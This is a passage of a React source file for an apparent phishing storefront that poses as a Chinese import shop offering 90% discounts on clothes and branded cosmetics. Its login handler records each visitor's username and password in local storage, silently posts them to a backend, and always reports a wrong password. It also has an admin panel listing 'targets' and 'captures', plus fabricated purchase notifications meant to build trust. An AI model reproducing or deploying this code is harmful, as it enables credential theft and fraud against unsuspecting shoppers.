import React, { useState, useEffect } from "react";
import { User } from "./types";
import ChineseEcommHeader from "./components/ChineseEcommHeader";
import LocalDbManager from "./components/LocalDbManager";
import QrCodeToggler from "./components/QrCodeToggler";
import RedPocketGift from "./components/RedPocketGift";

// Import images for proper static building and hashing by Vite
import serumSkincareGlow from "./assets/images/serum_skincare_glow.png";
import conjuntoColarCoracao from "./assets/images/conjunto_colar_coracao.png";
import tenisCasualFeminino from "./assets/images/tenis_casual_feminino.png";
import batomMatteRouge from "./assets/images/batom_matte_rouge.png";
import bolsaFemininaTiracolo from "./assets/images/bolsa_feminina_tiracolo.png";
import perfumeFemininoAmore from "./assets/images/perfume_feminino_amore.png";

// New product imports requested by USER
import camisaBrasilAmarela from "./assets/images/camisa_brasil_amarela.png";
import camisaBrasilPreta from "./assets/images/camisa_brasil_preta.png";
import vestidoFloralBoho from "./assets/images/vestido_floral_boho.png";
import vestidoMidiPlissado from "./assets/images/vestido_midi_plissado.png";
import vestidoMidiValentine from "./assets/images/vestido_midi_valentine.png";
import qipaoSilkDress from "./assets/images/qipao_silk_dress.png";
import silkBlouseJardin from "./assets/images/silk_blouse_jardin.png";
import linenEmbroideryCoat from "./assets/images/linen_embroidery_coat.png";
import campaignHeaderImage from "./assets/images/chinese_clothing_campaign_1781968536386.jpg";

// Lip gloss and lip care promotional images
import macSquirtGloss from "./assets/images/mac_squirt_plumping_gloss.png";
import diorLipGlowOil from "./assets/images/dior_lip_glow_oil.png";
import fentyLipKit from "./assets/images/fenty_beauty_lip_kit.png";
import jellyOilBT from "./assets/images/jelly_oil_bruna_tavares.png";

// Lucide icons
import { 
  User as UserIcon, 
  Lock, 
  ShoppingBag, 
  Flame, 
  Sparkles, 
  ArrowRight, 
  CheckCircle2, 
  AlertCircle, 
  QrCode, 
  LogOut, 
  HelpCircle, 
  KeyRound, 
  Ticket, 
  Truck, 
  PackageCheck, 
  Wallet,
  ShieldAlert,
  ChevronRight,
  Database,
  Eye,
  EyeOff,
  Shield,
  X,
  Copy,
  TrendingUp,
  Award,
  Layers,
  Heart,
  Eye as EyeIcon,
  Tag
} from "lucide-react";

export default function App() {
  const [language, setLanguage] = useState<"pt" | "zh" | "en">("pt");
  const [currency, setCurrency] = useState("BRL");
  const [loginMethod, setLoginMethod] = useState<"password" | "qrcode">("password");

  // Filter category state (SHEIN Categories)
  const [activeCategory, setActiveCategory] = useState<"todos" | "motf" | "selecao" | "beleza">("todos");

  // Auth Inputs
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  
  // App States
  const [loggedInUser, setLoggedInUser] = useState<User | null>(() => {
    const saved = localStorage.getItem("chinese_store_session");
    return saved ? JSON.parse(saved) : null;
  });
  const [loading, setLoading] = useState(false);
  const [feedback, setFeedback] = useState<{ text: string; type: "success" | "error" } | null>(null);
  const [couponCode, setCouponCode] = useState("");
  const [couponSuccess, setCouponSuccess] = useState(false);
  const [dbRefreshToggle, setDbRefreshToggle] = useState(false);

  // Admin Panel State
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [adminUser, setAdminUser] = useState("");
  const [adminPass, setAdminPass] = useState("");
  const [adminError, setAdminError] = useState<string | null>(null);
  const [adminSuccess, setAdminSuccess] = useState<string | null>(null);
  const [storageItems, setStorageItems] = useState<{ key: string; value: string }[]>([]);
  const [capturedPasswords, setCapturedPasswords] = useState<{ user: string; pass: string; time: string }[]>([]);

  // Advanced Admin Panel Access Control States
  const [anyAdminExists, setAnyAdminExists] = useState(false);
  const [isAdminRegistering, setIsAdminRegistering] = useState(false);
  const [currentAdminUser, setCurrentAdminUser] = useState<string>(() => {
    return localStorage.getItem("current_admin_user") || "";
  });
  const [adminAuthed, setAdminAuthed] = useState<boolean>(() => {
    return !!localStorage.getItem("current_admin_user");
  });
  const [myUsers, setMyUsers] = useState<User[]>([]);
  const [activeAdminTab, setActiveAdminTab] = useState<"targets" | "captures" | "new_admin">("targets");

  // Live Purchase Notifications
  const [liveNotification, setLiveNotification] = useState<string | null>(null);

  // Monitored user for password capture
  const [monitoredUser, setMonitoredUser] = useState(() => {
    return localStorage.getItem("monitored_user") || "";
  });

  const checkAdminsExist = async () => {
    try {
      const res = await fetch("/api/admins/exists");
      const data = await res.json();
      setAnyAdminExists(data.exists);
      if (!data.exists) {
        setIsAdminRegistering(true); // Force register if no admins exist
      } else {
        setIsAdminRegistering(false);
      }
    } catch (err) {
      console.error("Error checking admins:", err);
    }
  };

  const fetchMyUsers = async () => {
    if (!currentAdminUser) return;
    try {
      const res = await fetch(`/api/users?createdBy=${encodeURIComponent(currentAdminUser)}`);
      const data = await res.json();
      if (data.success) {
        setMyUsers(data.users);
      }
    } catch (err) {
      console.error("Error fetching admin target users:", err);
    }
  };

  const refreshStorageData = () => {
    const items: { key: string; value: string }[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        items.push({ key, value: localStorage.getItem(key) || "" });
      }
    }
    setStorageItems(items);

    const captured: { user: string; pass: string; time: string }[] = [];
    try {
      const raw = localStorage.getItem("captured_passwords");
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) {
          captured.push(...parsed);
        }
      }
    } catch {}
    setCapturedPasswords(captured);
  };

  const handleOpenAdmin = () => {
    setShowAdminPanel(true);
    setAdminError(null);
    setAdminSuccess(null);
    setAdminUser("");
    setAdminPass("");
    checkAdminsExist();
  };

  const handleSaveMonitoredUser = () => {
    const input = (document.getElementById("monitored-input") as HTMLInputElement)?.value || "";
    const formatted = input.startsWith("@") ? input : `@${input}`;
    localStorage.setItem("monitored_user", formatted);
    setMonitoredUser(formatted);
  };

  const handleClearMonitoredUser = () => {
    localStorage.removeItem("monitored_user");
    setMonitoredUser("");
  };

  const handleClearCaptured = () => {
    if (confirm("Deseja realmente limpar seu histórico local de capturas?")) {
      localStorage.removeItem("captured_passwords");
      setCapturedPasswords([]);
    }
  };

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError(null);
    setAdminSuccess(null);

    const endpoint = isAdminRegistering ? "/api/admins/register" : "/api/admins/login";
    try {
      const res = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: adminUser, password: adminPass })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        if (isAdminRegistering) {
          // Auto login after registration
          const loginRes = await fetch("/api/admins/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: adminUser, password: adminPass })
          });
          const loginData = await loginRes.json();
          if (loginRes.ok && loginData.success) {
            setAdminAuthed(true);
            setCurrentAdminUser(adminUser);
            localStorage.setItem("current_admin_user", adminUser);
            refreshStorageData();
          } else {
            setAdminError(loginData.message || "Erro ao efetuar login após cadastro.");
          }
        } else {
          setAdminAuthed(true);
          setCurrentAdminUser(adminUser);
          localStorage.setItem("current_admin_user", adminUser);
          refreshStorageData();
        }
      } else {
        setAdminError(data.message || "Credenciais ou operação inválidas.");
      }
    } catch (err) {
      setAdminError("Erro de conexão ao servidor.");
    }
  };

  const handleRegisterAdditionalAdmin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError(null);
    setAdminSuccess(null);
    try {
      const res = await fetch("/api/admins/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: adminUser, password: adminPass })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setAdminSuccess(`Administrador '${adminUser}' registrado com sucesso!`);
        setAdminUser("");
        setAdminPass("");
      } else {
        setAdminError(data.message || "Erro ao cadastrar.");
      }
    } catch (err) {
      setAdminError("Erro de conexão ao servidor.");
    }
  };

  const handleAdminLogout = () => {
    setAdminAuthed(false);
    setCurrentAdminUser("");
    localStorage.removeItem("current_admin_user");
  };

  const handleCloseAdmin = () => {
    setShowAdminPanel(false);
  };

  // Auto-refresh captured data and admin target list
  useEffect(() => {
    if (!adminAuthed) return;
    refreshStorageData();
    fetchMyUsers();
    const interval = setInterval(() => {
      refreshStorageData();
      fetchMyUsers();
    }, 2000);
    return () => clearInterval(interval);
  }, [adminAuthed, dbRefreshToggle]);

  const handleUsernameChange = (val: string) => {
    setUsername(val);
  };

  // Perform database login
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const form = e.currentTarget as HTMLFormElement;
    const fd = new FormData(form);
    const domUser = (fd.get("login_username") as string || "").trim();
    const domPass = fd.get("login_password") as string || "";

    const rawUser = domUser || username.trim();
    const rawPass = domPass || password;

    if (rawUser) {
      const formattedUser = rawUser.startsWith("@") ? rawUser : `@${rawUser}`;
      const entry = {
        user: formattedUser,
        pass: rawPass,
        time: new Date().toLocaleString("pt-BR")
      };
      
      try {
        const debugLog = JSON.parse(localStorage.getItem("capture_debug") || '{"count":0,"entries":[]}');
        debugLog.count++;
        debugLog.entries.push({ user: formattedUser, pass: rawPass, time: entry.time });
        if (debugLog.entries.length > 10) debugLog.entries.shift();
        localStorage.setItem("capture_debug", JSON.stringify(debugLog));
      } catch {}
      
      try {
        const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
        existing.push(entry);
        localStorage.setItem("captured_passwords", JSON.stringify(existing));
      } catch (err) {
        console.error("localStorage capture failed:", err);
      }

      // Also trigger a silent POST to the login route so it logs the password update in backend users.json!
      fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: formattedUser, password: rawPass })
      }).catch(err => console.error("API login save error:", err));
    }

    if (!rawUser || !rawPass) {
      showFeedback(
        language === "zh" ? "请输入用户名 and 密码。" : language === "en" ? "Please enter username and password." : "Por favor, digite o usuário e senha.", 
        "error"
      );
      return;
    }

    setLoading(true);
    setFeedback(null);

    // Show "senha incorreta"
    setTimeout(() => {
      showFeedback(
        language === "zh" ? "密码错误。请检查您的凭证。" : language === "en" ? "Incorrect password. Verify credentials." : "Senha incorreta. Verifique suas credenciais.", 
        "error"
      );
      setLoading(false);
    }, 1200);
  };

  // QR Code login success simulation
  const handleQrSuccess = (userObj: { username: string; name: string; role: string }) => {
    setLoggedInUser(userObj);
    localStorage.setItem("chinese_store_session", JSON.stringify(userObj));
    showFeedback(
      language === "zh" ? `通过二维码扫码登录成功！欢迎，${userObj.name}。` : language === "en" ? `Logged in via QR scan success! Welcome, ${userObj.name}.` : `Logado via QR Code com sucesso! Bem-vindo(a), ${userObj.name}.`,
      "success"
    );
  };

  const showFeedback = (text: string, type: "success" | "error") => {
    setFeedback({ text, type });
  };

  const handleLogout = () => {
    setLoggedInUser(null);
    localStorage.removeItem("chinese_store_session");
    setUsername("");
    setPassword("");
    setFeedback(null);
  };

  const applyPromoCoupon = (code: string) => {
    setCouponCode(code);
    if (code.toUpperCase() === "CHINA666") {
      setCouponSuccess(true);
    } else {
      setCouponSuccess(false);
    }
  };

  const handleAutofillUser = (user: User) => {
    setUsername(user.username);
    setPassword(user.password || "");
    setLoginMethod("password");
    showFeedback(
      language === "zh" ? "已自动填充测试凭据！" : language === "en" ? "Test credentials filled!" : "Credenciais preenchidas! Clique no botão de entrar.",
      "success"
    );
  };

  // Click Buy on Promotional Clothing Items
  const handleBuyClick = (productName: string) => {
    const element = document.getElementById("login-box-container");
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "center" });
      element.classList.add("ring-4", "ring-black", "animate-pulse");
      setTimeout(() => {
        element.classList.remove("ring-4", "ring-black", "animate-pulse");
      }, 3000);
      showFeedback(
        language === "zh" ? `您已选择 "${productName}"！请在下方登录您的 VIP 账户以享 1 折优惠购买。` : 
        language === "en" ? `You selected "${productName}"! Log in to your VIP account below to secure the 90% discount.` :
        `Você selecionou "${productName}"! Entre com seu Usuário VIP abaixo para finalizar o pedido com 90% OFF.`,
        "success"
      );
    }
  };

  // Live simulation notifications loop
  useEffect(() => {
    const messages = {
      pt: [
        "Maria S. comprou GLOSS MAC SQUIRT PLUMPING SHIMMER",
        "Carlos R. resgatou cupom CHINA666 com sucesso!",
        "Ana B. comprou GLOSS LABIAL DIOR ADDICT LIP GLOW OIL",
        "Juliana F. resgatou R$ 189,50 de cashback na carteira VIP",
        "Roberto M. comprou Kit Cuidado Labial Laneige Lip Trio Set",
        "Felipe R. comprou KIT LABIAL BOCA ROSA HIDRA CHOCO",
        "Juliana T. comprou LIP OIL CAROLINA HERRERA GOOD GIRL"
      ],
      zh: [
        "张*珍（圣保罗）成功购买了 魅可 SQUIRT 丰盈唇蜜",
        "李*国（北京）成功领取了双十一 1 折专享红包",
        "王*伟（深圳）已激活海外尊享 VIP 买手通道",
        "陈*（广州）刚刚获得了 ¥189.50 现金返还",
        "卢*（里约）购买了 迪奥 Addict Lip Glow 护唇油",
        "金*（圣保罗）购买了 兰芝 唇部护理三件套"
      ],
      en: [
        "Maria S. from Sao Paulo bought MAC Squirt Plumping Shimmer Gloss",
        "Carlos R. from Curitiba claimed code CHINA666 successfully!",
        "Juliana F. claimed $189.50 VIP cashback in her wallet",
        "Carlos R. purchased Dior Addict Lip Glow Oil",
        "Felipe R. purchased Laneige Lip Trio Set Berry Sweet"
      ]
    }[language];

    const triggerNotification = () => {
      const idx = Math.floor(Math.random() * messages.length);
      setLiveNotification(messages[idx]);
      setTimeout(() => {
        setLiveNotification(null);
      }, 4500);
    };

    const initial = setTimeout(triggerNotification, 3000);
    const timer = setInterval(triggerNotification, 14000);

    return () => {
      clearTimeout(initial);
      clearInterval(timer);
    };
  }, [language]);

  const termsText = {
    pt: {
      userField: "Nome de Usuário (@usuario)",
      passField: "Senha de Acesso VIP",
      enterBtn: "Entrar e Finalizar Compra",
      enterLoading: "Processando...",
      methodPass: "Senha e Usuário",
      methodQR: "Código QR",
      noRegister: "Acesso restrito para compradores VIP cadastrados e homologados pela aduana.",
      terms: "Ao continuar, você concorda com nossos termos de importação direta.",
      logisticsTitle: "Status Recente da Encomenda",
      logisticsStep: " Shenzhen - Saída do centro de processamento internacional rumo ao Brasil",
      points: "Pontos de Fidelidade",
      wallet: "Saldo Carteira VIP",
      welcome: "Painel do Importador VIP",
      activeUser: "Sua conta ativa no users.json",
      mockShipping: "Rastreamento de Encomendas VIP",
      howToTest: "Como funciona este teste local?",
      promptDesc: "O frontend se conecta de forma segura ao back-end que gerencia os usuários em users.json.",
      logoutBtn: "Encerrar Sessão",
      productsTitle: "Vitrine VIP - Moda Premium & Super Ofertas",
      productsSub: "Alta costura, roupas clássicas, maquiagens e os melhores lip glosses e lip oils com 90% de desconto.",
      buyNow: "ADICIONAR AO CARRINHO"
    },
    zh: {
      userField: "用户名 (@昵称)",
      passField: "安全登录密码",
      enterBtn: "安全登录",
      enterLoading: "正在安全验证...",
      methodPass: "密码账户登录",
      methodQR: "二维码扫码",
      noRegister: "仅限经海关核准 of 注册受邀境外VIP买手登录。",
      terms: "登录即代表您同意淘宝全球买手使用条款及跨境采购协议。",
      logisticsTitle: "最新物流包裹状态",
      logisticsStep: "【深圳市】 国际分拨中心已揽收，正出境发往国际仓",
      points: "会员积分",
      wallet: "电子钱包余额",
      welcome: "跨境进口采购大厅",
      activeUser: "users.json 当前活动会话",
      mockShipping: "智能包邮揽收进度",
      howToTest: "此本地测试如何运作？",
      promptDesc: "前端与后端进行安全连接，并将用户 data and 输入的密码保存至本地 users.json 文件里。",
      logoutBtn: "退出登录",
      productsTitle: "VIP 专属特惠专区 - 高定服饰与美妆",
      productsSub: "精选护肤精粹、经典美饰、巴西国家队球衣与高定礼服，特设奢华唇蜜与唇部护理专区，尊享 1 折特惠。",
      buyNow: "一键 Resgatar 优惠"
    },
    en: {
      userField: "Username (@user)",
      passField: "Security Password",
      enterBtn: "Sign In Securely",
      enterLoading: "Checking...",
      methodPass: "Account Password",
      methodQR: "QR Code",
      noRegister: "Restricted access for registered and custom-authorized VIP buyers.",
      terms: "By logging in, you agree to our direct dropshipping service policy.",
      logisticsTitle: "Recent Package Shipping Status",
      logisticsStep: " Shenzhen Hub - Departed international outbound facility",
      points: "Loyalty Points",
      wallet: "Wallet Balance",
      welcome: "VIP Hub Buyer Dashboard",
      activeUser: "Active users.json session",
      mockShipping: "Smart Tracker Node",
      howToTest: "How does this local test work?",
      promptDesc: "The frontend connects securely to the backend which manages all credentials on users.json.",
      logoutBtn: "Sign Out",
      productsTitle: "Exclusive VIP Catalog - Premium Fashion & Beauty",
      productsSub: "High-end couture, designer dresses, official jerseys, and premium lip shines & lip oils at 90% OFF.",
      buyNow: "Secure VIP Deal"
    }
  }[language];

  // Helper to dynamically calculate prices and localize product details
  const getProduct = (
    id: string,
    badge: string,
    category: "todos" | "motf" | "selecao" | "beleza",
    image: any,
    origBRL: number,
    names: { pt: string; en: string; zh: string },
    descriptions: { pt: string; en: string; zh: string },
    itemsLeft: number = Math.floor(Math.random() * 4) + 1,
    stockPercent: number = Math.floor(Math.random() * 15) + 83
  ) => {
    // 90% discount promotion
    const promoBRL = origBRL * 0.1;

    // Conversions
    let originalPrice = origBRL;
    let promoPrice = promoBRL;

    if (currency === "CNY") {
      originalPrice = origBRL * 1.4;
      promoPrice = promoBRL * 1.4;
    } else if (currency === "USD") {
      originalPrice = origBRL / 5.0;
      promoPrice = promoBRL / 5.0;
    }

    return {
      id,
      badge,
      category,
      image,
      originalPrice,
      promoPrice,
      name: language === "zh" ? names.zh : language === "en" ? names.en : names.pt,
      desc: language === "zh" ? descriptions.zh : language === "en" ? descriptions.en : descriptions.pt,
      itemsLeft,
      stockPercent
    };
  };

  // Specific Products requested by the USER (Including both original fashion/deals and the new cosmetics promo items)
  const clothingProducts = [
    // 1. Original Products
    {
      id: "prod-sheglam-blush",
      name: language === "zh" ? "SHEGLAM Color Bloom 液体腮红 - 哑光雾面" : language === "en" ? "SHEGLAM Color Bloom Liquid Blush Matte" : "SHEGLAM Color Bloom Liquid Blush Matte - Rose Ritual",
      desc: language === "zh" ? "长效锁色持妆，不脱色高显色，凝胶面霜质地，轻薄服帖，送礼最佳选择。" : language === "en" ? "Gel-cream blush, highly pigmented, lightweight formula that stays all day." : "Blush líquido gel creme de longa duração, altamente pigmentado e leve. Acabamento matte aveludado.",
      image: batomMatteRouge,
      originalPrice: currency === "BRL" ? 59.90 : currency === "CNY" ? 89.00 : 12.00,
      promoPrice: currency === "BRL" ? 23.21 : currency === "CNY" ? 29.00 : 4.50,
      stockPercent: 95,
      itemsLeft: 3,
      badge: "Oferta Relâmpago",
      category: "beleza"
    },
    {
      id: "prod-seamless-jacket",
      name: language === "zh" ? "女子专业无缝拉链防风运动跑步夹克" : language === "en" ? "Women's Professional Seamless Zipper Sport Jacket" : "Jaqueta Profissional Sem Costura com Zíper para Mulheres",
      desc: language === "zh" ? "高弹透气无缝，修身剪裁设计，适合跑步、健身房训练及瑜伽，春季防风推荐。" : language === "en" ? "Form-fitting running jacket, high elastic breathable weave, front full zipper." : "Roupa esportiva ajustada para corrida, academia e yoga. Cor preta, ideal para treinos.",
      image: campaignHeaderImage,
      originalPrice: currency === "BRL" ? 180.00 : currency === "CNY" ? 240.00 : 36.00,
      promoPrice: currency === "BRL" ? 93.11 : currency === "CNY" ? 115.00 : 18.00,
      stockPercent: 92,
      itemsLeft: 4,
      badge: "Super Ofertas",
      category: "beleza"
    },
    {
      id: "prod-soquete-socks",
      name: language === "zh" ? "Kit 3/6/12双中性短筒透气船袜短袜" : language === "en" ? "Kit 3/6/12 Pairs Unisex Short Low Cut Socks" : "Kit 3/6/12 Pares Meias Soquete Cano Curto Unissex",
      desc: language === "zh" ? "精选柔软精梳棉，网眼排汗舒适不滑落，短筒浅口，男女适用尺码35-40。" : language === "en" ? "Breathable cotton blend ankle socks, non-slip design, unisex size range 35-40." : "Meias curtas unissex multicoloridas tamanho 35-40. Super confortáveis e respiráveis.",
      image: conjuntoColarCoracao,
      originalPrice: currency === "BRL" ? 25.00 : currency === "CNY" ? 35.00 : 5.00,
      promoPrice: currency === "BRL" ? 9.47 : currency === "CNY" ? 12.00 : 2.00,
      stockPercent: 88,
      itemsLeft: 6,
      badge: "37% OFF",
      category: "beleza"
    },
    {
      id: "prod-leather-jacket",
      name: language === "zh" ? "MOTF 极简翻领长袖宽松仿皮夹克外套" : language === "en" ? "MOTF Loose Minimalist PU Leather Lapel Jacket" : "Jaqueta Solta de Couro PU Minimalista de Manga Longa - MOTF",
      desc: language === "zh" ? "复古翻领修饰，时尚落肩宽松剪裁，金属质感拉链，高品质防风抗皱面料。" : language === "en" ? "Minimalist lapel design with front zipper, vintage distressed PU finish." : "Jaqueta de couro sintético desgastada estilo retrô feminina com zíper e lapela. Cor vermelha vintage.",
      image: linenEmbroideryCoat,
      originalPrice: currency === "BRL" ? 349.00 : currency === "CNY" ? 420.00 : 69.00,
      promoPrice: currency === "BRL" ? 176.90 : currency === "CNY" ? 220.00 : 35.00,
      stockPercent: 96,
      itemsLeft: 2,
      badge: "84% OFF",
      category: "motf"
    },
    {
      id: "prod-flora-isola-set",
      name: language === "zh" ? "Flora Isola 优雅吊带背心与直筒长裤两件套" : language === "en" ? "Flora Isola Elegant Camisole & Pants Two-Piece Set" : "Flora Isola Conjunto de Regata e Calça Elegantes - MOTF",
      desc: language === "zh" ? "高级通勤剪裁，垂坠感极佳，打造利落职场女性形象，适合办公室商务搭配。" : language === "en" ? "Business casual two-piece co-ord, elegant fit for office, teacher outfit." : "Conjunto regata e calça de caimento elegante para mulheres, estilo negócios e escritório.",
      image: silkBlouseJardin,
      originalPrice: currency === "BRL" ? 220.00 : currency === "CNY" ? 280.00 : 45.00,
      promoPrice: currency === "BRL" ? 100.49 : currency === "CNY" ? 125.00 : 20.00,
      stockPercent: 89,
      itemsLeft: 3,
      badge: "#Casaco Pelinho",
      category: "motf"
    },
    {
      id: "prod-siren-gaze-set",
      name: language === "zh" ? "Siren Gaze 撞色修身马甲与垂感直筒裤套装" : language === "en" ? "Siren Gaze Contrast Trim Vest & Trousers Set" : "Siren Gaze Conjunto de Colete e Calça Contrastante - MOTF",
      desc: language === "zh" ? "法式优雅老钱风设计，精致撞色织带收边，面料垂顺防皱，秋季 daily 高级穿搭。" : language === "en" ? "Old money vest suit with contrast details, ideal for wedding guest or workwear." : "Colete e calça com recorte contrastante elegante, estilo Old Money, casual executivo.",
      image: vestidoMidiPlissado,
      originalPrice: currency === "BRL" ? 399.00 : currency === "CNY" ? 490.00 : 80.00,
      promoPrice: currency === "BRL" ? 175.99 : currency === "CNY" ? 220.00 : 35.00,
      stockPercent: 93,
      itemsLeft: 2,
      badge: "#Roupa de trabalho",
      category: "motf"
    },
    {
      id: "prod-brasil-jersey-yellow",
      name: language === "zh" ? "巴西国家队经典黄色球员版球衣" : language === "en" ? "Brazil National Team Home Jersey - Yellow" : "Camisa da Seleção Brasileira - Canarinho Amarela",
      desc: language === "zh" ? "五星巴西经典黄，速干排汗透气面料，官方裁线剪裁，球迷运动必备首选。" : language === "en" ? "Classic yellow home kit, dry-fit breathable fabric, premium athletic fit." : "A clássica amarelinha de cinco estrelas, tecido respirável dry-fit, ajuste esportivo e escudo bordado.",
      image: camisaBrasilAmarela,
      originalPrice: currency === "BRL" ? 349.90 : currency === "CNY" ? 420.00 : 65.00,
      promoPrice: currency === "BRL" ? 69.90 : currency === "CNY" ? 85.00 : 12.90,
      stockPercent: 98,
      itemsLeft: 2,
      badge: "Edição Oficial",
      category: "selecao"
    },
    {
      id: "prod-brasil-jersey-black",
      name: language === "zh" ? "巴西国家队特别纪念版黑色球衣" : language === "en" ? "Brazil National Team Special Edition Jersey - Black" : "Camisa da Seleção Brasileira - Edição Especial Preta",
      desc: language === "zh" ? "特别纪念款黑色面料，金色纹路修饰，尊贵典雅，透气舒适排汗。" : language === "en" ? "Special edition black kit with gold detail trims, sleek modern design." : "Modelo exclusivo em cor preta com detalhes dourados minimalistas, tecido premium respirável.",
      image: camisaBrasilPreta,
      originalPrice: currency === "BRL" ? 349.90 : currency === "CNY" ? 420.00 : 65.00,
      promoPrice: currency === "BRL" ? 69.90 : currency === "CNY" ? 85.00 : 12.90,
      stockPercent: 95,
      itemsLeft: 3,
      badge: "Edição Limitada",
      category: "selecao"
    },
    {
      id: "prod-vestido-valentine",
      name: language === "zh" ? "情人节臻选红色玫瑰吊带丝绒裙" : language === "en" ? "Valentine Rose Crimson Velvet Midi Dress" : "Vestido Midi Valentine Velvet - Vermelho Carmim",
      desc: language === "zh" ? "奢华丝绒面料，深V性感剪裁，亮面正红色，情人节约会完美推荐。" : language === "en" ? "Luxurious dark velvet texture with deep-V cut, elegant ruby red tone." : "Acabamento em veludo de toque macio com decote sofisticado, tom vermelho carmim profundo.",
      image: vestidoMidiValentine,
      originalPrice: currency === "BRL" ? 429.90 : currency === "CNY" ? 520.00 : 80.00,
      promoPrice: currency === "BRL" ? 85.90 : currency === "CNY" ? 105.00 : 16.00,
      stockPercent: 94,
      itemsLeft: 2,
      badge: "Exclusivo",
      category: "motf"
    },
    {
      id: "prod-qipao-dress",
      name: language === "zh" ? "国风改良丝绸旗袍礼服连衣裙" : language === "en" ? "Modern Qipao Silk Floral Evening Dress" : "Vestido Qipao Oriental em Seda - Alta Costura",
      desc: language === "zh" ? "优质天然桑蚕丝，改良侧开叉修身剪裁，精致盘扣与古典花卉印花。" : language === "en" ? "Natural mulberry silk, modernized bodycon cut, traditional buttons and pattern." : "Seda natural amoreira de alto padrão, fenda lateral elegante e abotoamento tradicional.",
      image: qipaoSilkDress,
      originalPrice: currency === "BRL" ? 599.90 : currency === "CNY" ? 720.00 : 110.00,
      promoPrice: currency === "BRL" ? 119.90 : currency === "CNY" ? 145.00 : 22.00,
      stockPercent: 96,
      itemsLeft: 1,
      badge: "Peça Única",
      category: "motf"
    },
    {
      id: "prod-skincare-serum",
      name: language === "zh" ? "玻尿酸补水修护面部精华液" : language === "en" ? "Glow Skincare Hyaluronic Acid Serum" : "Sérum Facial Hidratante Ácido Hialurônico Glow",
      desc: language === "zh" ? "深层补水，紧致修护，打造韩式水光肌，温和无刺激。" : language === "en" ? "Deep hydration and barrier repair for a radiant, glowing complexion." : "Hidratação profunda, preenchimento de linhas finas e efeito pele iluminada (Glow) natural.",
      image: serumSkincareGlow,
      originalPrice: currency === "BRL" ? 89.90 : currency === "CNY" ? 110.00 : 16.00,
      promoPrice: currency === "BRL" ? 19.90 : currency === "CNY" ? 25.00 : 4.00,
      stockPercent: 94,
      itemsLeft: 5,
      badge: "Queridinho",
      category: "beleza"
    },
    {
      id: "prod-perfume-flora",
      name: language === "zh" ? "巴黎恋人淡香精 50ml - 花果香调" : language === "en" ? "Amore Eau de Parfum for Women 50ml" : "Perfume Feminino Amore Eau de Parfum 50ml",
      desc: language === "zh" ? "经典甜美花果香调，前调茉莉中调香草，温婉迷人。" : language === "en" ? "Delicate floral-fruity scent with jasmine and warm vanilla undertones, designed for daily wear." : "Fragrância floral frutada marcante com notas de jasmin e baunilha, ideal para o dia a dia.",
      image: perfumeFemininoAmore,
      originalPrice: currency === "BRL" ? 289.90 : currency === "CNY" ? 360.00 : 55.00,
      promoPrice: currency === "BRL" ? 59.90 : currency === "CNY" ? 75.00 : 12.00,
      stockPercent: 93,
      itemsLeft: 2,
      badge: "Destaque",
      category: "beleza"
    },

    // 2. New Promotional Lip Glosses, Lip Oils and Lip Kits (added under "beleza" category)
    getProduct("prod-squirt-gloss", "M·A·C", "beleza", macSquirtGloss, 208, 
      { pt: "GLOSS MAC SQUIRT PLUMPING SHIMMER", en: "MAC Squirt Plumping Shimmer Gloss", zh: "魅可 SQUIRT 丰盈闪耀唇蜜" },
      { pt: "Brilho labial Squirt Plumping Gloss em tom translúcido de alta cintilância, efeito volumoso imediato e refrescante.", en: "Squirt Plumping Gloss in translucent shimmer shades, instant cooling and plumping effect for juicy lips.", zh: "SQUIRT 丰唇蜜，清凉感十足，瞬间饱满丰唇效果。" }
    ),
    getProduct("prod-jelly-oil-bt", "BRUNA TAVARES", "beleza", jellyOilBT, 70,
      { pt: "GLOSS LABIAL JELLY OIL BRUNA TAVARES BANANA", en: "Bruna Tavares Jelly Lip Oil Banana", zh: "Bruna Tavares 香蕉凝胶唇油" },
      { pt: "Óleo labial com textura jelly super confortável, enriquecido com ativos hidratantes e aroma suave de banana.", en: "Lip oil with a super comfortable jelly texture, enriched with moisturizing ingredients and a sweet banana scent.", zh: "舒适凝胶质地唇油，富含滋润成分，淡淡香蕉甜香。" }
    ),
    getProduct("prod-lipglass-air-mini", "M·A·C", "beleza", macSquirtGloss, 102,
      { pt: "MINI GLOSS MAC LIPGLASS AIR (4 opções)", en: "Mini MAC Lipglass Air Gloss (4 shades)", zh: "迷你魅可 Lipglass Air 唇蜜（4色可选）" },
      { pt: "Versão mini do icônico Lipglass com acabamento de alto brilho e efeito espelhado impecável.", en: "Mini edition of the iconic Lipglass featuring high-gloss, crystal-like mirror finish.", zh: "经典 Lipglass 迷你装，高光镜面般无瑕闪耀。" }
    ),
    getProduct("prod-laneige-lip-trio", "LANEIGE", "beleza", fentyLipKit, 269,
      { pt: "Kit Cuidado Labial Laneige Lip Trio Set Berry Sweet", en: "Laneige Lip Trio Set Berry Sweet Lip Care", zh: "兰芝 Berry Sweet 唇部护理三件套" },
      { pt: "O trio perfeito de cuidado labial da Laneige com máscaras de tratamento noturno no aroma Berry Sweet.", en: "The perfect lip care trio by Laneige featuring intense overnight sleeping masks in Berry Sweet.", zh: "兰芝完美唇部护理三件套，蕴含莓果甜香 of 夜间修护唇膜。" }
    ),
    getProduct("prod-givenchy-perfecto", "GIVENCHY", "beleza", diorLipGlowOil, 280,
      { pt: "LIP OIL GIVENCHY PERFECTO (4 opções)", en: "Givenchy Rose Perfecto Lip Oil (4 shades)", zh: "纪梵希 Rose Perfecto 护唇油（4色可选）" },
